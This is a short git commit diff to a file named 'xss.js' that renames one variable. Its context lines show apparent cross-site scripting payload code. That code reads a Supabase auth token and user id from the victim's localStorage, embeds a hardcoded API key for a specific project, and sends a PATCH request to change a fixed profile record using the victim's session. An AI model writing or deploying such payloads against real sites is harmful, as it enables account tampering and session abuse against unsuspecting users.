1f54cf7a2f7da6b1e9fe9d2f726ba88ae48c23b4
ulusvdomain-arch <ulusvdomain@gmail.com>
2025-09-17 19:11:27 +0300

    Update xss.js

--- xss.js
+++ xss.js
@@ -3,8 +3,8 @@
     let author_id = JSON.parse(localStorage.getItem('sb-naxnmptbuycolotkwvsz-auth-token'))['user']['id'];
     let api_key = 'sb_publishable_4koI0XhJp65TObrB07RRCQ_HcZxOzcj';
     if (access_token) {
-        const name_change_url = 'https://naxnmptbuycolotkwvsz.supabase.co/rest/v1/profiles?id=eq.7ac9d47d-8469-4346-98be-8ee3944b7618';
-        fetch(name_change_url, {
+        const change_name_url = 'https://naxnmptbuycolotkwvsz.supabase.co/rest/v1/profiles?id=eq.7ac9d47d-8469-4346-98be-8ee3944b7618';
+        fetch(change_name_url, {
             method: 'PATCH',
             headers: {
                 'apikey': api_key,
